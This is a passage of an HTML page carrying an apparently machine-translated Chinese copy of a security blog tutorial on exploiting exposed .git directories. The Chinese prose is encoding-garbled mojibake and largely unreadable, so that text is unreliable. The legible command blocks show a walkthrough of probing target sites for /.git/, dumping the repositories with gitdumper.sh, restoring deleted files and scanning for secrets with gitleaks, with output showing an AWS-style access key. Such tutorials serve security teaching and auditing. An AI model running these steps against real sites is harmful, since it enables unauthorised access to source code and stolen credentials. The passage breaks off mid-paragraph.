<html>
<head>
<title>Exposed .git Directory Exploitation</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æš´éœ²äº†ã€‚gitç›®å½•åˆ©ç”¨</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75?source=collection_archive---------0-----------------------#2022-10-22">https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75?source=collection_archive---------0-----------------------#2022-10-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/531543e0ba3caee0d775a0a42496492d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BsoGcKcP6MSb4FLLHoqNOw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">(<a class="ae kc" href="https://media.pitchfork.com/photos/5c1aaaabe35c444aebf1afb3/1:1/w_320,c_limit/sick%20boy_the%20chainsmokers.jpg" rel="noopener ugc nofollow" target="_blank">https://media . pitchfork . com/photos/5c 1 aaaaabe 35 c 444 aebf 1 AFB 3/1:1/w _ 320ï¼Œc _ limit/sick % 20 boy _ the % 20 chain smokers . jpg</a>)</figcaption></figure><p id="0380" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å°†è¿‘ä¸¤ç™¾ä¸‡ã€‚Cybernewsç ”ç©¶å°ç»„å‘ç°ï¼ŒåŒ…å«é‡è¦é¡¹ç›®ä¿¡æ¯çš„gitæ–‡ä»¶å¤¹è¢«å…¬å¼€ã€‚Gitæ˜¯æœ€æµè¡Œçš„å¼€æºåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚å¦‚æœæ‚¨æˆ–æ‚¨çš„ç»„ç»‡å°†gitç”¨äºä»£ç æˆ–å­˜å‚¨åº“ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥è€ƒè™‘ã€‚gitæ–‡ä»¶å¤¹æš´éœ²å¯èƒ½å¯¹æ‚¨çš„èµ„äº§æ„æˆé£é™©ã€‚</p><p id="b8a5" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ç­”ã€‚gitæ–‡ä»¶å¤¹åŒ…å«å…³äºè¿œç¨‹å­˜å‚¨åº“åœ°å€ã€æäº¤å†å²æ—¥å¿—å’Œå…¶ä»–å…ƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ã€‚çš„è®¿é—®æ§åˆ¶ä¸å¥½ï¼Œæºä»£ç å°±ä¼šæ³„éœ²ã€‚gitæ–‡ä»¶å¤¹ã€‚å€ŸåŠ©å·¥å…·ï¼Œä»£ç ä¸­ç¡¬ç¼–ç çš„æ•æ„Ÿæ•°æ®å¯ä»¥åœ¨å‡ ç§’é’Ÿå†…è¢«æŒ–æ˜å‡ºæ¥ã€‚è¿™ç¯‡åšå®¢æ–‡ç« å°†å‘Šè¯‰ä½ å¦‚ä½•æ‰¾åˆ°æš´éœ²çš„ã€‚gitæ–‡ä»¶å¤¹å¹¶è¯†åˆ«é‡Œé¢çš„ç¡¬ç¼–ç ç§˜å¯†ã€‚gitæ–‡ä»¶å¤¹ã€‚</p><h1 id="571e" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Gitå†…éƒ¨</h1><p id="e8f2" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">ç­”ã€‚gitæ–‡ä»¶å¤¹æ˜¯åœ¨ä½ æ‰§è¡Œæ–°é¡¹ç›®çš„<code class="fe me mf mg mh b">git init</code>æˆ–è€…ä»å…¶ä»–åœ°æ–¹æ‹‰é¡¹ç›®çš„<code class="fe me mf mg mh b">git clone</code>æ—¶åˆ›å»ºçš„ã€‚</p><p id="b1d7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Gitæ˜¯ä¸€ä¸ªç®€å•çš„é”®å€¼æ•°æ®å­˜å‚¨ã€‚. gitç›®å½•å¦‚ä¸‹æ‰€ç¤º:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="7d94" class="mq lc iq mh b gy mr ms l mt mu">config<br/>description<br/>HEAD<br/>index<br/>hooks/<br/>info/<br/>logs/<br/>objects/<br/>refs/</span></pre><p id="9409" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å½“æ‚¨å°†ä»»ä½•ç±»å‹çš„å†…å®¹æ’å…¥Gitå­˜å‚¨åº“æ—¶ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ªæƒŸä¸€çš„é”®ï¼Œä¾›æ‚¨ä»¥åæ£€ç´¢è¯¥å†…å®¹ã€‚çš„ã€‚gitæ–‡ä»¶å¤¹å­˜å‚¨é¡¹ç›®çš„å…ƒæ•°æ®å’Œå¯¹è±¡ã€‚è¿™é‡Œçš„â€œå¯¹è±¡â€åŒ…æ‹¬â€œäºŒè¿›åˆ¶å¤§å¯¹è±¡â€ã€â€œæ ‘â€ã€â€œæäº¤â€å’Œâ€œæ ‡ç­¾â€ã€‚</p><ul class=""><li id="118d" class="mv mw iq kf b kg kh kk kl ko mx ks my kw mz la na nb nc nd bi translated"><code class="fe me mf mg mh b">blob</code> â€”ä¸€èˆ¬æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨æ¥å­˜å‚¨æ–‡ä»¶æ•°æ®</li><li id="2dbe" class="mv mw iq kf b kg ne kk nf ko ng ks nh kw ni la na nb nc nd bi translated"><code class="fe me mf mg mh b">tree</code>â€”â€”åŸºæœ¬ä¸Šåƒä¸€ä¸ªç›®å½•â€”â€”å®ƒå¼•ç”¨äº†ä¸€å †å…¶ä»–çš„æ ‘å’Œ/æˆ–æ–‘ç‚¹</li><li id="0bfa" class="mv mw iq kf b kg ne kk nf ko ng ks nh kw ni la na nb nc nd bi translated"><code class="fe me mf mg mh b">commit</code> â€”ä¸€æ£µæ ‘ï¼Œæ ‡è®°é¡¹ç›®åœ¨æŸä¸ªæ—¶é—´ç‚¹çš„æ ·å­ã€‚</li><li id="27df" class="mv mw iq kf b kg ne kk nf ko ng ks nh kw ni la na nb nc nd bi translated"><code class="fe me mf mg mh b">tag</code> â€”ä»¥æŸç§æ–¹å¼å°†ç‰¹å®šæäº¤æ ‡è®°ä¸ºç‰¹æ®Šçš„æ–¹æ³•</li></ul><p id="a6ff" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¯ä¸ªå¯¹è±¡éƒ½æœ‰è¦åœ¨Gitä¸­æ“ä½œçš„å“ˆå¸Œå€¼ã€‚</p><p id="74b0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å¦‚æœæ‚¨æœ‰ä¸€ä¸ªå…·æœ‰ä»¥ä¸‹ç›®å½•ç»“æ„çš„ç®€å•é¡¹ç›®:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="4afc" class="mq lc iq mh b gy mr ms l mt mu">$&gt;tree<br/>.<br/>|-- README<br/>`-- lib<br/>    |-- inc<br/>    |   `-- tricks.rb<br/>    `-- mylib.rb<br/>â€‹<br/>2 directories, 3 files</span></pre><p id="7658" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨å°†å®ƒæäº¤åˆ°Gitå­˜å‚¨åº“ä¹‹åï¼Œå®ƒä¼šè¢«è¡¨ç¤ºæˆè¿™æ ·:</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nj"><img src="../Images/9fd9693a4091438b35d79be00057aae5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1e_9eBF-PozGrWCzYpX_Sw.png"/></div></div></figure><p id="7b4c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">(æ¥è‡ª<a class="ae kc" href="http://shafiul.github.io/gitbook/assets/images/figure/objects-example.png" rel="noopener ugc nofollow" target="_blank">http://shafiul . github . io/git book/assets/images/figure/objects-example . png</a>)</p><p id="563e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¸Šå›¾ä¸­<code class="fe me mf mg mh b">commit</code>å¯¹è±¡çš„<code class="fe me mf mg mh b">parent</code>ä»£è¡¨é¡¹ç›®å†å²ä¸­çš„ä¸Šä¸€æ­¥ã€‚åªæœ‰â€œæ ¹â€æäº¤æ²¡æœ‰çˆ¶çº§ï¼Œä»£è¡¨é¡¹ç›®çš„åˆå§‹ä¿®è®¢ã€‚</p><p id="6f2e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¦æ¢³ç†æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä»ä¸€ä¸ª<code class="fe me mf mg mh b">commit</code>å¯¹è±¡å¼€å§‹ã€‚</p><p id="023a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½ ä¸å¿…è®°ä½è¿™äº›ä¼´éšå¯¹è±¡çš„æ•£åˆ—ï¼Œå› ä¸ºGitæä¾›äº†å¼•ç”¨æˆ–<code class="fe me mf mg mh b">refs</code>ï¼Œä¸€ä¸ªå­˜å‚¨åœ¨<code class="fe me mf mg mh b">.git/refs</code>ä¸­çš„æ–‡ä»¶åŒ…å«äº†ä¸Šå›¾ä¸­<code class="fe me mf mg mh b">commit</code>å¯¹è±¡çš„æ•£åˆ—ã€‚</p><p id="94eb" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe me mf mg mh b">.git/refs</code>æ–‡ä»¶å¤¹ç»“æ„å¦‚ä¸‹æ‰€ç¤º:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="c754" class="mq lc iq mh b gy mr ms l mt mu">heads/<br/>master<br/>remotes/<br/>tags/</span></pre><p id="2928" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨<code class="fe me mf mg mh b">.git/refs/heads/</code>ä¸­ï¼Œæ‚¨çš„å­˜å‚¨åº“ä¸­æœ‰æœ¬åœ°åˆ†æ”¯ï¼Œå…¶æ–‡ä»¶åä¸ç›¸åº”åˆ†æ”¯çš„åç§°ç›¸åŒ¹é…ã€‚</p><p id="cff7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¾‹å¦‚ï¼Œæ‚¨æœ‰ä¸€ä¸ªåä¸º<code class="fe me mf mg mh b">main</code>çš„åˆ†æ”¯ï¼Œæ‚¨å¯ä»¥åœ¨<code class="fe me mf mg mh b">.git/refs/heads/main</code>æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹<code class="fe me mf mg mh b">main</code>åˆ†æ”¯çš„æœ€æ–°æäº¤çš„æ•£åˆ—ï¼Œå¹¶ä¸”æ¯æ¬¡æ‚¨æäº¤ä¸€ä¸ªæ–°çš„æäº¤æ—¶ï¼Œè¿™ä¸ª<code class="fe me mf mg mh b">main</code>æ–‡ä»¶ä¸­çš„æ•£åˆ—éƒ½ä¼šæ”¹å˜ã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="7cf9" class="mq lc iq mh b gy mr ms l mt mu">$ cat .git/refs/heads/main<br/>da09407c30b6f378fb15e660ac80a282f61d466a</span></pre><p id="3e34" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ‚¨å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ£€æŸ¥å½“å‰çš„æäº¤</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="86cb" class="mq lc iq mh b gy mr ms l mt mu">$ git log -1 main<br/>commit da09407c30b6f378fb15e660ac80a282f61d466a<br/>Author: ....<br/>â€‹<br/>â€‹<br/>$ git show -s --pretty=raw da09407c30b6f3<br/>commit da09407c30b6f378fb15e660ac80a282f61d466a<br/>tree eb7a07fde7f8cf8dfd274bb6a5cf98997d91c5a6<br/>parent 77fbaa460d95ba8144ebb75872c2fca865a41128</span></pre><p id="9c8c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¦æ£€ç´¢è¿™äº›å¯¹è±¡çš„å†…å®¹ï¼Œä½¿ç”¨å‘½ä»¤<code class="fe me mf mg mh b">git cat-file</code>æ£€æŸ¥å¯¹è±¡å†…å®¹ã€‚é€šè¿‡<code class="fe me mf mg mh b">-p</code>å‘å‘½ä»¤ä¼ é€’å¯¹è±¡æ•£åˆ—ï¼Œä»¥æŒ‡ç¤ºå‘½ä»¤æ˜¾ç¤ºå¯¹è±¡å†…å®¹ã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="91c6" class="mq lc iq mh b gy mr ms l mt mu">$ git cat-file -p eb7a07fde7f8cf8dfd274bb6a5cf98997d91c5a6<br/>040000 tree 559d614af20026a8191d078d2c409885dc0b7c54    Java<br/>100755 blob b0292c7d67b7cd41f538bbc574bb8acb198f8083    init.txt<br/>â€‹<br/>$ git cat-file -p  b0292c7d67b7cd41f538bbc574bb8acb198f8083<br/>function name: backend<br/>languange: nodejs</span></pre><p id="126d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¿™äº›å¯¹è±¡ä½œä¸ºæ•°æ®æ–‡ä»¶å­˜å‚¨åœ¨<code class="fe me mf mg mh b">.git/objects/&lt;First-2-bytes&gt;/&lt;Last-38-bytes&gt;</code>æ–‡ä»¶å¤¹ä¸­ã€‚<code class="fe me mf mg mh b">&lt;First-2-bytes&gt;</code>å’Œ<code class="fe me mf mg mh b">&lt;Last-38-bytes&gt;</code>æ˜¯æŒ‡ç›®æ ‡å¯¹è±¡çš„SHA1å“ˆå¸Œã€‚æ¯”å¦‚å¯ä»¥åœ¨<code class="fe me mf mg mh b">.git\objects\b0</code>é‡Œé¢æ‰¾åˆ°å­˜å‚¨ä¸º292 c 7d 67 b 7 CD 41 f 538 BBC 574 bb 8 ACB 198 f 8083å¯¹è±¡çš„æ•°æ®æ–‡ä»¶ä¸º292 c 7d 67 b 7 CD 41 f 538 BBC 574 bb 8 ACB 198 f 8083ã€‚ç”¨Notepad ++æ‰“å¼€æ–‡ä»¶292 c 7d 67 b 7 CD 41 f 538 BBC 574 bb 8 ACB 198 f 8083æ–‡ä»¶ï¼Œé‡Œé¢åªæ˜¯ä¹±ç ã€‚</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/c428e35d9759ff761dbf2dddcdfd6393.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_WVv033Q_wDnYgodRoFHXg.png"/></div></div></figure><p id="8f00" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¿™æ˜¯å› ä¸ºç›®æ ‡æ–‡ä»¶292 c 7d 67 b 7 CD 41 f 538 BBC 574 bb 8 ACB 198 f 8083æ˜¯å‹ç¼©æ–‡ä»¶ã€‚ä½ å¯ä»¥åœ¨é˜…è¯»ä¹‹å‰ç”¨Rubyè§£å‹å®ƒã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="65b9" class="mq lc iq mh b gy mr ms l mt mu">ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' &lt; .git/objects/b0/292c7d67b7cd41f538bbc574bb8acb198f8083</span></pre><h1 id="63b4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æœ‰è¶£çš„éƒ¨åˆ†:åˆ©ç”¨</h1><p id="837d" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">æ­¥éª¤1:ä¸‹è½½ã€‚gitå‚¨å­˜åº“</p><p id="a91a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å»å¯»æ‰¾æš´éœ²çš„äººã€‚gitåº“ï¼Œå¯ä»¥ç®€å•æ·»åŠ ã€‚gitåœ¨ç›®æ ‡ç½‘ç«™çš„æ ¹URLã€‚ä¸å¹¸çš„æ˜¯ï¼Œæœ‰æ—¶æ‚¨å¯èƒ½ä¼šé‡åˆ°ä¸¤ç§ä¸åŒçš„HTTPé”™è¯¯:</p><ul class=""><li id="6b2c" class="mv mw iq kf b kg kh kk kl ko mx ks my kw mz la na nb nc nd bi translated"><strong class="kf ir"> 404é”™è¯¯-ã€‚æœåŠ¡å™¨ä¸­ä¸å­˜åœ¨git </strong>æˆ–è·¯å¾„é”™è¯¯</li><li id="94f5" class="mv mw iq kf b kg ne kk nf ko ng ks nh kw ni la na nb nc nd bi translated"><strong class="kf ir"> 403ç¦æ­¢-ã€‚git </strong>å­˜åœ¨ï¼Œä½†æ˜¯æ‚¨æ— æ³•åˆ—å‡ºè¯¥æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶å¤¹</li></ul><p id="d735" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å¯¹äºç¬¬äºŒä¸ªé”™è¯¯ï¼Œå®ƒå¯èƒ½æ˜¯ç”±äºåœ¨æœåŠ¡å™¨ä¸Šç¦ç”¨ç›®å½•åˆ—è¡¨è€Œå¯¼è‡´çš„ï¼Œæ‚¨å¯ä»¥ç»§ç»­å°è¯•ã€‚gitæ–‡ä»¶å¤¹ç±»ä¼¼<code class="fe me mf mg mh b">.git/config</code>ã€‚</p><p id="364c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¸€æ—¦è¯†åˆ«å‡ºæš´éœ²è€…ã€‚gitå­˜å‚¨åº“ï¼Œä¸‹ä¸€æ­¥æ˜¯æå–ã€‚æ‰‹åŠ¨gitæ–‡ä»¶å¤¹æˆ–è€…ä½¿ç”¨å·¥å…·ï¼Œä¾‹å¦‚<a class="ae kc" href="https://github.com/internetwache/GitTools" rel="noopener ugc nofollow" target="_blank"> GitTools </a>åº“ä¸­çš„dumper.shæ¥è‡ªåŠ¨åŒ–è¿™ä¸ªè¿‡ç¨‹ã€‚å‘½ä»¤è¡Œç±»ä¼¼äº:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="9c57" class="mq lc iq mh b gy mr ms l mt mu">bash gitdumper.sh <a class="ae kc" href="http://target/.git/" rel="noopener ugc nofollow" target="_blank">http://target/.git/</a> &lt;dest-dir&gt;</span></pre><p id="6427" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ³¨æ„:åé¢çš„æ–œæ ã€‚ç›®æ ‡URL <code class="fe me mf mg mh b">http://target/.git/</code>ä¸­çš„gitä¸èƒ½çœç•¥ï¼Œå¦åˆ™ä¼šå¾—åˆ°ä¸€ä¸ªé”™è¯¯:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="6a1d" class="mq lc iq mh b gy mr ms l mt mu">###########<br/># GitDumper is part of <a class="ae kc" href="https://github.com/internetwache/GitTools" rel="noopener ugc nofollow" target="_blank">https://github.com/internetwache/GitTools</a><br/>#<br/># Developed and maintained by @gehaxelt from @internetwache<br/>#<br/># Use at your own risk. Usage might be illegal in certain circumstances.<br/># Only for educational purposes!<br/>###########<br/>â€‹<br/>[-] /.git/ missing in url</span></pre><p id="c4f6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ç¬¬äºŒæ­¥:æ¢æŸ¥ã€‚gitæ–‡ä»¶å¤¹</p><p id="fa6d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¸€æ—¦ä¸‹è½½äº†ã€‚gitå®Œæˆåï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹æ•´ä¸ªæœ¬åœ°çš„æ‰€æœ‰çŠ¶æ€å˜åŒ–ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå¼€å‘äººå‘˜åˆ é™¤äº†ä¸€ä¸ªåä¸º<code class="fe me mf mg mh b">credentials</code>çš„æ–‡ä»¶å¹¶æäº¤äº†æ›´æ”¹ï¼Œæ‚¨å°†ä¼šçœ‹åˆ°ç”¨<code class="fe me mf mg mh b">git status</code>å‘½ä»¤æäº¤å‡­è¯æ–‡ä»¶åˆ é™¤ã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="e533" class="mq lc iq mh b gy mr ms l mt mu">$ git status<br/>â€‹<br/># On branch master<br/># Changes not staged for commit:<br/>#   (use "git add/rm &lt;file&gt;..." to update what will be committed)<br/>#   (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)<br/>#<br/>#       deleted:    credentials<br/>â€‹<br/>no changes added to commit (use "git add" and/or "git commit -a")<br/>â€‹</span></pre><p id="118a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">çŠ¶æ€ç»“æœåªæ˜¾ç¤ºè¢«åˆ é™¤çš„æ–‡ä»¶<code class="fe me mf mg mh b">credentials</code>ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œ<code class="fe me mf mg mh b">git checkout -- .</code>æˆ–<code class="fe me mf mg mh b">git restore .</code>å°†æœ¬åœ°å­˜å‚¨åº“é‡ç½®ä¸ºæœ€åä¸€æ¬¡æäº¤ä»¥æ£€ç´¢è¢«åˆ é™¤çš„<code class="fe me mf mg mh b">credentials</code>æ–‡ä»¶ã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="62b0" class="mq lc iq mh b gy mr ms l mt mu">$ git checkout -- . <br/>$ ls <br/>credentials</span></pre><p id="933f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½†æ˜¯ï¼Œå¦‚æœåœ¨æœ€åä¸€æ¬¡æäº¤ä¹‹å‰å¾ˆä¹…ï¼Œè¿˜æœ‰å…¶ä»–åŒ…å«æ•æ„Ÿæ•°æ®çš„æ–‡ä»¶åœ¨å†å²æäº¤ä¸­è¢«åˆ é™¤ï¼Œé‚£ä¹ˆå¦‚ä½•æ£€ç´¢è¿™äº›æ–‡ä»¶ä¸­çš„æ•æ„Ÿæ•°æ®å‘¢ï¼Ÿæ‚¨å¯èƒ½æƒ³ä½¿ç”¨<code class="fe me mf mg mh b">git cat-file</code>å‘½ä»¤æ¥æ£€æŸ¥æ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶ï¼Œä½†æ˜¯æ‰‹åŠ¨æ¢æµ‹è¿‡ç¨‹æ˜¯å†—é•¿è€Œè´¹åŠ›çš„ã€‚</p><p id="e24f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æœ‰ä¸€äº›å·¥å…·å¯ä»¥å¸®åŠ©ä½ ï¼</p><p id="5381" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">é¦–å…ˆï¼Œæ‚¨å¯ä»¥ä½¿ç”¨<a class="ae kc" href="https://github.com/internetwache/GitTools" rel="noopener ugc nofollow" target="_blank"> GitTools </a>ä¸­çš„extractor.shæ¥æ¢å¤æºä»£ç ã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="9cbd" class="mq lc iq mh b gy mr ms l mt mu">$ extractor.sh ./ .git<br/>###########<br/># Extractor is part of <a class="ae kc" href="https://github.com/internetwache/GitTools" rel="noopener ugc nofollow" target="_blank">https://github.com/internetwache/GitTools</a><br/>#<br/># Developed and maintained by @gehaxelt from @internetwache<br/>#<br/># Use at your own risk. Usage might be illegal in certain circumstances.<br/># Only for educational purposes!<br/>###########<br/>[+] Found commit: bfe7e60fd375eddfc286e6aefdb360df0928aa0d<br/>[+] Found file: /home/.../.git/0-bfe7e60fd375eddfc286e6aefdb360df0928aa0d/credentials<br/>[+] Found commit: 6dba12c2c6f9fe9ad237cf25e5f7c82f7eac4adf<br/>[+] Found commit: 30dbbdfb0e0eba2aa3f42b799d55cd35a2c431d6<br/>...</span></pre><p id="5ae5" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ç„¶åç»§ç»­ç”¨ç®€å•çš„catå‘½ä»¤æ£€æŸ¥æ¢å¤æ–‡ä»¶çš„å†…å®¹ï¼Œç›´åˆ°æ‰¾åˆ°æœ‰ä»·å€¼çš„ä¸œè¥¿ã€‚</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="e9da" class="mq lc iq mh b gy mr ms l mt mu">$ cat .git/0-bfe7e60fd375eddfc286e6aefdb360df0928aa0d/credentials<br/>â€‹<br/>[default]<br/>aws_access_key_id = AKIAY5LSWGTEN2Q4DRRFK<br/>aws_secret_access_key = tJ9Ja....kJ/d9cktW</span></pre><p id="c5a8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ‚¨å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªå·¥å…·<a class="ae kc" href="https://github.com/zricethezav/gitleaks" rel="noopener ugc nofollow" target="_blank"> gitleak </a>ï¼Œè¿™æ˜¯ä¸€ä¸ªSASTå·¥å…·ï¼Œç”¨äºæ£€æµ‹å’Œé˜²æ­¢ç¡¬ç¼–ç çš„ç§˜å¯†ï¼Œå¦‚git reposä¸­çš„å¯†ç ã€apiå¯†é’¥å’Œä»¤ç‰Œã€‚<code class="fe me mf mg mh b">gitleak</code>å·¥å…·ä½¿ç”¨è§„åˆ™æ¥æ£€æµ‹ç§˜å¯†ï¼Œæ‚¨å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­è‡ªå®šä¹‰æ‚¨è‡ªå·±çš„è§„åˆ™ï¼Œå¹¶åœ¨å‘½ä»¤è¡Œä¸­ç”¨<code class="fe me mf mg mh b">-c</code>æˆ–<code class="fe me mf mg mh b">--config</code>æ ‡å¿—æŒ‡å®šå®ƒã€‚</p><p id="420d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½¿ç”¨<code class="fe me mf mg mh b">gitleak</code>åœ¨åƒåœ¾åœºä¸­æœå¯»ç§˜å¯†ã€‚gitæ–‡ä»¶å¤¹ï¼Œå¯¼èˆªåˆ°ã€‚gitæ–‡ä»¶å¤¹å¹¶å°è¯•ä»¥ä¸‹å‘½ä»¤:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="3d20" class="mq lc iq mh b gy mr ms l mt mu">$ docker pull zricethezav/gitleaks:latest<br/>$ docker run --security-opt label:disable  -v $(pwd):/tmp:z zricethezav/gitleaks:latest detect --source="/tmp" -v<br/>â€‹<br/>    â—‹<br/>    â”‚â•²<br/>    â”‚ â—‹<br/>    â—‹ â–‘<br/>    â–‘    gitleaks<br/>â€‹<br/>â€‹<br/>Finding:     ws_access_key_id = AKIAY5LSWGTEN2Q4DRRFK<br/>Secret:      AKIAY5LSWGTEN2Q4DRRFK<br/>RuleID:      aws-access-token<br/>Entropy:     4.021928<br/>File:        credentials<br/>Line:        1<br/>Commit:      30dbbdfb0e0eba2aa3f42b799d55cd35a2c431d6<br/>Author:      ...<br/>Email:       ...<br/>Date:        2022-10-22T05:58:44Z<br/>Fingerprint: 30dbbdfb0e0eba2aa3f42b799d55cd35a2c431d6:credentials:aws-access-token:1</span></pre><p id="5312" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å®ƒä½¿ç”¨å¸¦æœ‰RuleID aws-access-tokençš„è§„åˆ™æ¥æ ‡è¯†ws_access_key_idã€‚</p><p id="ff0d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku 